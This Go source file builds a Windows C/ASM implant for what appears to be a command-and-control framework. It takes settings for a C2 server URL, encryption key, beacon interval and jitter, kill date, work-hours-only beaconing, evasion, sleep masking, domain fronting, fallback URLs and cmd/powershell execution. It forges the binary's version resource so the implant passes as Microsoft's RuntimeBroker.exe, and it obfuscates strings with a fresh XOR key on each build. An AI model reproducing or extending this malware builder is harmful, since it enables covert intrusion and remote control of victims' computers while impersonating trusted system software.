package main

import (
	"bytes"
	"crypto/md5"
	"crypto/rand"
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"
)

// CConfig holds parameters for building the C/ASM implant.
type CConfig struct {
	ServerURL    string
	EncKey       string
	SecKey       string // currently reserved
	InstanceSalt string // if empty, generated randomly

	IntervalSec  int
	JitterPct    int
	MaxRetries   int
	KillDate     string // "YYYY-MM-DD" or ""
	WorkHoursOnly bool
	WorkStart    int
	WorkEnd      int

	EnableEvasion bool
	SleepMasking  bool
	C2Profile     string
	FrontDomain   string
	FallbackURLs  string
	ExecMethod    string // "cmd" | "powershell"
	CertPin       string // SHA-256 hex of server cert DER, or "" to disable
	Debug         bool

	// PE masquerade — version resource + post-build patches
	MasqCompany  string // default: "Microsoft Corporation"
	MasqProduct  string // default: "Microsoft Windows Operating System"
	MasqDesc     string // default: "Runtime Broker"
	MasqInternal string // default: "RuntimeBroker"
	MasqOrigFile string // default: "RuntimeBroker.exe"
	MasqVerMajor int    // default: 10
	MasqVerMinor int    // default: 0
	MasqVerBuild int    // default: 19041
	MasqVerRev   int    // default: 1

	OutputDir  string
	OutputName string
}

// BuildC compiles the C/ASM implant using MinGW cross-compiler + NASM.
// It copies the implant-c source tree to a temp directory, writes config.h,
// runs make, and returns a Result.
func BuildC(cfg *CConfig) (*Result, error) {
	if cfg.ServerURL == "" {
		return nil, fmt.Errorf("ServerURL is required")
	}
	if cfg.EncKey == "" {
		return nil, fmt.Errorf("EncKey is required")
	}

	start := time.Now()

	// Generate random instance salt if not provided
	if cfg.InstanceSalt == "" {
		salt := make([]byte, 8)
		rand.Read(salt) //nolint:errcheck
		cfg.InstanceSalt = hex.EncodeToString(salt)
	}

	// Defaults
	if cfg.IntervalSec <= 0 {
		cfg.IntervalSec = 60
	}
	if cfg.JitterPct < 0 {
		cfg.JitterPct = 20
	}
	if cfg.MaxRetries <= 0 {
		cfg.MaxRetries = 5
	}
	if cfg.ExecMethod == "" {
		cfg.ExecMethod = "cmd"
	}

	// PE masquerade defaults — mimic RuntimeBroker.exe (legitimate Win10+ process)
	if cfg.MasqCompany == "" {
		cfg.MasqCompany = "Microsoft Corporation"
	}
	if cfg.MasqProduct == "" {
		cfg.MasqProduct = "Microsoft Windows Operating System"
	}
	if cfg.MasqDesc == "" {
		cfg.MasqDesc = "Runtime Broker"
	}
	if cfg.MasqInternal == "" {
		cfg.MasqInternal = "RuntimeBroker"
	}
	if cfg.MasqOrigFile == "" {
		cfg.MasqOrigFile = "RuntimeBroker.exe"
	}
	if cfg.MasqVerMajor == 0 {
		cfg.MasqVerMajor = 10
	}
	// MasqVerBuild 0 is a valid build number, but 0 looks suspicious — default to 19041
	if cfg.MasqVerBuild == 0 {
		cfg.MasqVerBuild = 19041
	}
	if cfg.MasqVerRev == 0 {
		cfg.MasqVerRev = 1
	}

	// Locate implant-c source relative to module root
	modRoot := moduleRoot()
	implantSrc := filepath.Join(modRoot, "implant-c")
	if _, err := os.Stat(implantSrc); err != nil {
		return nil, fmt.Errorf("implant-c source not found at %s", implantSrc)
	}

	// Create temp build directory
	tmpDir, err := os.MkdirTemp("", "taburtuai-c-*")
	if err != nil {
		return nil, fmt.Errorf("create temp dir: %w", err)
	}
	defer os.RemoveAll(tmpDir)

	// Copy source tree into temp dir
	if err := copyDir(implantSrc, tmpDir); err != nil {
		return nil, fmt.Errorf("copy source: %w", err)
	}

	// Write generated config.h from template
	tmplPath := filepath.Join(tmpDir, "include", "config.h.tmpl")
	tmplBytes, err := os.ReadFile(tmplPath)
	if err != nil {
		return nil, fmt.Errorf("read config.h.tmpl: %w", err)
	}

	boolVal := func(b bool) string {
		if b {
			return "1"
		}
		return "0"
	}

	configH := string(tmplBytes)
	replacements := map[string]string{
		"@@SERVER_URL@@":     cfg.ServerURL,
		"@@ENC_KEY@@":        cfg.EncKey,
		"@@SEC_KEY@@":        cfg.SecKey,
		"@@INSTANCE_SALT@@":  cfg.InstanceSalt,
		"@@INTERVAL@@":       fmt.Sprintf("%d", cfg.IntervalSec),
		"@@JITTER@@":         fmt.Sprintf("%d", cfg.JitterPct),
		"@@MAX_RETRIES@@":    fmt.Sprintf("%d", cfg.MaxRetries),
		"@@KILL_DATE@@":      cfg.KillDate,
		"@@WORK_HOURS_ONLY@@": boolVal(cfg.WorkHoursOnly),
		"@@WORK_START@@":     fmt.Sprintf("%d", cfg.WorkStart),
		"@@WORK_END@@":       fmt.Sprintf("%d", cfg.WorkEnd),
		"@@ENABLE_EVASION@@": boolVal(cfg.EnableEvasion),
		"@@SLEEP_MASKING@@":  boolVal(cfg.SleepMasking),
		"@@C2_PROFILE@@":     cfg.C2Profile,
		"@@FRONT_DOMAIN@@":   cfg.FrontDomain,
		"@@FALLBACK_URLS@@":  cfg.FallbackURLs,
		"@@EXEC_METHOD@@":    cfg.ExecMethod,
		"@@CERT_PIN@@":       cfg.CertPin,
		"@@DEBUG@@":          boolVal(cfg.Debug),
	}
	for k, v := range replacements {
		configH = strings.ReplaceAll(configH, k, v)
	}

	configPath := filepath.Join(tmpDir, "include", "config.h")
	if err := os.WriteFile(configPath, []byte(configH), 0644); err != nil {
		return nil, fmt.Errorf("write config.h: %w", err)
	}

	// Write generated version.rc from template
	rcTmplPath := filepath.Join(tmpDir, "resource", "version.rc.tmpl")
	rcTmplBytes, err := os.ReadFile(rcTmplPath)
	if err != nil {
		return nil, fmt.Errorf("read version.rc.tmpl: %w", err)
	}
	rcContent := string(rcTmplBytes)
	rcReplacements := map[string]string{
		"@@VER_COMPANY@@":  cfg.MasqCompany,
		"@@VER_PRODUCT@@":  cfg.MasqProduct,
		"@@VER_DESC@@":     cfg.MasqDesc,
		"@@VER_INTERNAL@@": cfg.MasqInternal,
		"@@VER_ORIGFILE@@": cfg.MasqOrigFile,
		"@@VER_MAJ@@":      fmt.Sprintf("%d", cfg.MasqVerMajor),
		"@@VER_MIN@@":      fmt.Sprintf("%d", cfg.MasqVerMinor),
		"@@VER_BUILD@@":    fmt.Sprintf("%d", cfg.MasqVerBuild),
		"@@VER_REV@@":      fmt.Sprintf("%d", cfg.MasqVerRev),
	}
	for k, v := range rcReplacements {
		rcContent = strings.ReplaceAll(rcContent, k, v)
	}
	rcPath := filepath.Join(tmpDir, "resource", "version.rc")
	if err := os.WriteFile(rcPath, []byte(rcContent), 0644); err != nil {
		return nil, fmt.Errorf("write version.rc: %w", err)
	}

	// Determine output path
	if cfg.OutputDir == "" {
		cfg.OutputDir = "./output"
	}
	if err := os.MkdirAll(cfg.OutputDir, 0755); err != nil {
		return nil, fmt.Errorf("create output dir: %w", err)
	}

	outName := cfg.OutputName
	if outName == "" {
		outName = "implant_c.exe"
	}
	if !strings.HasSuffix(outName, ".exe") {
		outName += ".exe"
	}
	outPath := filepath.Join(cfg.OutputDir, outName)

	// Override Makefile output directory to a subdir in the temp tree
	buildDir := filepath.Join(tmpDir, "build")
	if err := os.MkdirAll(buildDir, 0755); err != nil {
		return nil, fmt.Errorf("create build dir: %w", err)
	}

	// Generate per-build string obfuscation XOR key (16 bytes → 32-char hex)
	obfKeyBytes := make([]byte, 16)
	rand.Read(obfKeyBytes) //nolint:errcheck
	obfKey := hex.EncodeToString(obfKeyBytes)

	// Run make
	makeArgs := []string{fmt.Sprintf("OBF_KEY=%s", obfKey)}
	if cfg.Debug {
		makeArgs = append(makeArgs, "DEBUG=1")
	}

	makeCmd := exec.Command("make", makeArgs...)
	fmt.Printf("[*] String obfuscation key: %s\n", obfKey)
	makeCmd.Dir = tmpDir

	var makeBuf bytes.Buffer
	makeCmd.Stdout = &makeBuf
	makeCmd.Stderr = &makeBuf

	fmt.Printf("[*] Building C implant (MinGW + NASM)...\n")
	if err := makeCmd.Run(); err != nil {
		return nil, fmt.Errorf("make failed:\n%s", makeBuf.String())
	}

	// Copy binary to output dir
	builtBinary := filepath.Join(buildDir, "implant.exe")
	if cfg.Debug {
		builtBinary = filepath.Join(buildDir, "implant_debug.exe")
	}

	binBytes, err := os.ReadFile(builtBinary)
	if err != nil {
		return nil, fmt.Errorf("read built binary: %w", err)
	}

	if err := os.WriteFile(outPath, binBytes, 0755); err != nil {
		return nil, fmt.Errorf("write output: %w", err)
	}

	info, err := os.Stat(outPath)
	if err != nil {
		return nil, fmt.Errorf("stat output: %w", err)
	}

	md5sum := md5.Sum(binBytes)
	sha256sum := sha256.Sum256(binBytes)

	fmt.Printf("[+] C implant compiled: %s\n", outPath)
	fmt.Printf("    Size             : %d KB\n", info.Size()/1024)
	fmt.Printf("    SHA256           : %x\n", sha256sum)
	fmt.Printf("    Build time       : %s\n", time.Since(start).Round(time.Millisecond))

	return &Result{
		OutputPath: outPath,
		FileSize:   info.Size(),
		MD5:        fmt.Sprintf("%x", md5sum),
		SHA256:     fmt.Sprintf("%x", sha256sum),
		BuildTime:  time.Since(start),
		Format:     FormatEXE,
	}, nil
}

// ── Directory copy helper ─────────────────────────────────────────────────

func copyDir(src, dst string) error {
	return filepath.Walk(src, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}
		rel, err := filepath.Rel(src, path)
		if err != nil {
			return err
		}
		target := filepath.Join(dst, rel)

		if info.IsDir() {
			return os.MkdirAll(target, info.Mode())
		}

		return copyFile(path, target, info.Mode())
	})
}

func copyFile(src, dst string, mode os.FileMode) error {
	srcF, err := os.Open(src)
	if err != nil {
		return err
	}
	defer srcF.Close()

	dstF, err := os.OpenFile(dst, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, mode)
	if err != nil {
		return err
	}
	defer dstF.Close()

	_, err = io.Copy(dstF, srcF)
	return err
}
